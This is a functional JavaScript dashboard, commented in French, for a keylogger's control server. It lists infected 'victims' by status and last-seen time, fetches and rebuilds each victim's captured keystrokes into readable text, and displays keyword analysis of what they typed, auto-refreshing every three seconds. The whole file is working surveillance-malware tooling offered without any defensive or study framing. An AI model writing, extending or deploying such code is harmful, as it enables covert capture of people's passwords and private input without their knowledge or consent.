// Variables globales
let currentVictimId = null;
let autoRefreshInterval = null;
let lastLogCount = 0;

// Initialisation au chargement de la page
document.addEventListener('DOMContentLoaded', function() {
    refreshVictims();
    startAutoRefresh();
});

// Fonction pour rafraîchir la liste des victimes
async function refreshVictims() {
    try {
        const response = await fetch('/victims');
        const data = await response.json();
        const victims = data.victims || [];
        
        // Mettre à jour le compteur
        document.getElementById('victims-count').textContent = `${victims.length} victime(s)`;
        
        // Mettre à jour la liste
        const victimsList = document.getElementById('victims-list');
        const victimSelect = document.getElementById('victim-select');
        
        if (victims.length === 0) {
            victimsList.innerHTML = '<div class="text-center text-muted">Aucune victime enregistrée</div>';
            victimSelect.innerHTML = '<option value="">-- Aucune victime --</option>';
            return;
        }
        
        // Générer la liste HTML
        let listHTML = '';
        let selectHTML = '<option value="">-- Choisir une victime --</option>';
        
        victims.forEach(victim => {
            const isActive = victim.active;
            const statusClass = isActive ? 'status-active' : 'status-inactive';
            const statusText = isActive ? 'ACTIVE' : 'INACTIVE';
            const lastSeen = formatDate(victim.last_seen);
            
            listHTML += `
                <div class="list-group-item victim-item ${currentVictimId === victim.victim_id ? 'active' : ''}" 
                     onclick="selectVictim('${victim.victim_id}')">
                    <div class="d-flex justify-content-between align-items-center">
                        <div>
                            <strong>${victim.victim_id.substring(0, 8)}...</strong>
                            <div class="victim-id">${victim.victim_id}</div>
                        </div>
                        <div class="text-end">
                            <span class="${statusClass}">● ${statusText}</span>
                            <div class="small text-muted">${lastSeen}</div>
                        </div>
                    </div>
                </div>
            `;
            
            selectHTML += `<option value="${victim.victim_id}">${victim.victim_id.substring(0, 8)}... (${statusText})</option>`;
        });
        
        victimsList.innerHTML = listHTML;
        victimSelect.innerHTML = selectHTML;
        
        // Sélectionner la victime actuelle si elle existe
        if (currentVictimId) {
            victimSelect.value = currentVictimId;
            const activeItem = document.querySelector(`.victim-item[onclick*="${currentVictimId}"]`);
            if (activeItem) {
                document.querySelectorAll('.victim-item').forEach(item => item.classList.remove('active'));
                activeItem.classList.add('active');
            }
        }
        
        // Mettre à jour les statistiques
        updateStats(victims);
        
    } catch (error) {
        console.error('Erreur lors du rafraîchissement:', error);
        document.getElementById('victims-list').innerHTML = 
            '<div class="text-danger">Erreur de connexion au serveur</div>';
    }
}

// Sélectionner une victime
function selectVictim(victimId) {
    currentVictimId = victimId;
    document.getElementById('victim-select').value = victimId;
    
    // Mettre à jour l'affichage
    document.querySelectorAll('.victim-item').forEach(item => {
        item.classList.remove('active');
    });
    document.querySelector(`.victim-item[onclick*="${victimId}"]`)?.classList.add('active');
    
    // Charger les logs
    loadVictimLogs();
}

// Charger les logs d'une victime
async function loadVictimLogs() {
    const victimId = document.getElementById('victim-select').value || currentVictimId;
    
    if (!victimId) {
        document.getElementById('logs-display').innerHTML = 
            '<p class="text-muted text-center">Sélectionnez une victime pour voir les logs</p>';
        return;
    }
    
    currentVictimId = victimId;
    
    try {
        const response = await fetch(`/victims/${victimId}/logs`);
        const data = await response.json();
        const logs = data.logs || [];
        
        displayLogs(logs);
        lastLogCount = logs.length;
        
    } catch (error) {
        console.error('Erreur lors du chargement des logs:', error);
        document.getElementById('logs-display').innerHTML = 
            '<p class="text-danger">Erreur lors du chargement des logs</p>';
    }
}

// Afficher les logs formatés
function displayLogs(logs) {
    const logsDisplay = document.getElementById('logs-display');
    
    if (logs.length === 0) {
        logsDisplay.innerHTML = '<p class="text-muted text-center">Aucun log disponible</p>';
        return;
    }
    
    let html = '';
    let textBuffer = '';
    
    logs.forEach((log, index) => {
        const key = log.key || '';
        const timestamp = formatTime(log.timestamp);
        
        // Construire le texte
        if (key === '\n') {
            if (textBuffer.trim()) {
                html += `<div class="log-line"><span class="log-key">${escapeHtml(textBuffer)}</span></div>`;
            }
            html += `<div class="log-line"><span class="log-special">[ENTER]</span> <span class="log-timestamp">${timestamp}</span></div>`;
            textBuffer = '';
        } else if (key === '[BACKSPACE]') {
            if (textBuffer) {
                textBuffer = textBuffer.slice(0, -1);
            }
            html += `<div class="log-line"><span class="log-special">[BACKSPACE]</span> <span class="log-timestamp">${timestamp}</span></div>`;
        } else if (key === ' ') {
            textBuffer += ' ';
        } else if (key.length === 1 && /[a-zA-Z0-9]/.test(key)) {
            textBuffer += key;
        } else {
            // Touche spéciale
            if (textBuffer.trim()) {
                html += `<div class="log-line"><span class="log-key">${escapeHtml(textBuffer)}</span></div>`;
                textBuffer = '';
            }
            html += `<div class="log-line"><span class="log-special">[${escapeHtml(key)}]</span> <span class="log-timestamp">${timestamp}</span></div>`;
        }
    });
    
    // Afficher le buffer restant
    if (textBuffer.trim()) {
        html += `<div class="log-line"><span class="log-key">${escapeHtml(textBuffer)}</span></div>`;
    }
    
    logsDisplay.innerHTML = html;
    
    // Scroll vers le bas
    logsDisplay.scrollTop = logsDisplay.scrollHeight;
}

// Analyser les logs d'une victime
async function analyzeCurrentVictim() {
    const victimId = document.getElementById('victim-select').value || currentVictimId;
    
    if (!victimId) {
        alert('Veuillez sélectionner une victime');
        return;
    }
    
    try {
        const response = await fetch(`/victims/${victimId}/analyze`);
        const data = await response.json();
        const analysis = data.analysis || {};
        
        displayAnalysis(analysis);
        
    } catch (error) {
        console.error('Erreur lors de l\'analyse:', error);
        alert('Erreur lors de l\'analyse');
    }
}

// Afficher l'analyse
function displayAnalysis(analysis) {
    const analysisCard = document.getElementById('analysis-card');
    const analysisContent = document.getElementById('analysis-content');
    
    let html = `
        <div class="analysis-section">
            <h6>📊 Statistiques</h6>
            <p><strong>Total de touches:</strong> ${analysis.total_keys || 0}</p>
        </div>
    `;
    
    if (analysis.keywords && analysis.keywords.length > 0) {
        html += `
            <div class="analysis-section">
                <h6>🔑 Mots-clés détectés</h6>
                <div>
                    ${analysis.keywords.map(kw => 
                        `<span class="badge bg-primary keyword-badge">${escapeHtml(kw)}</span>`
                    ).join('')}
                </div>
            </div>
        `;
    }
    
    if (analysis.repetitive_sequences && analysis.repetitive_sequences.length > 0) {
        html += `
            <div class="analysis-section">
                <h6>🔄 Séquences répétitives</h6>
                <ul>
                    ${analysis.repetitive_sequences.map(seq => 
                        `<li>'${escapeHtml(seq.key)}' répété <strong>${seq.count}</strong> fois</li>`
                    ).join('')}
                </ul>
            </div>
        `;
    }
    
    analysisContent.innerHTML = html;
    analysisCard.style.display = 'block';
}

// Mettre à jour les statistiques
function updateStats(victims) {
    if (victims.length === 0) {
        document.getElementById('total-logs').textContent = '0';
        document.getElementById('last-activity').textContent = '-';
        return;
    }
    
    // Trouver la dernière activité
    const activeVictims = victims.filter(v => v.active);
    if (activeVictims.length > 0) {
        const lastSeen = activeVictims.sort((a, b) => 
            new Date(b.last_seen) - new Date(a.last_seen)
        )[0].last_seen;
        document.getElementById('last-activity').textContent = formatDate(lastSeen);
    }
}

// Effacer l'affichage des logs
function clearLogs() {
    document.getElementById('logs-display').innerHTML = 
        '<p class="text-muted text-center">Logs effacés</p>';
    document.getElementById('analysis-card').style.display = 'none';
}

// Démarrer l'auto-refresh
function startAutoRefresh() {
    if (document.getElementById('auto-refresh').checked) {
        autoRefreshInterval = setInterval(() => {
            refreshVictims();
            if (currentVictimId) {
                loadVictimLogs();
            }
        }, 3000); // Rafraîchir toutes les 3 secondes
    }
}

// Arrêter l'auto-refresh
function stopAutoRefresh() {
    if (autoRefreshInterval) {
        clearInterval(autoRefreshInterval);
        autoRefreshInterval = null;
    }
}

// Toggle auto-refresh
function toggleAutoRefresh() {
    if (document.getElementById('auto-refresh').checked) {
        startAutoRefresh();
    } else {
        stopAutoRefresh();
    }
}

// Fonctions utilitaires
function formatDate(dateString) {
    if (!dateString || dateString === 'Jamais') return 'Jamais';
    try {
        const date = new Date(dateString);
        return date.toLocaleString('fr-FR');
    } catch (e) {
        return dateString;
    }
}

function formatTime(dateString) {
    if (!dateString) return '';
    try {
        const date = new Date(dateString);
        return date.toLocaleTimeString('fr-FR');
    } catch (e) {
        return '';
    }
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

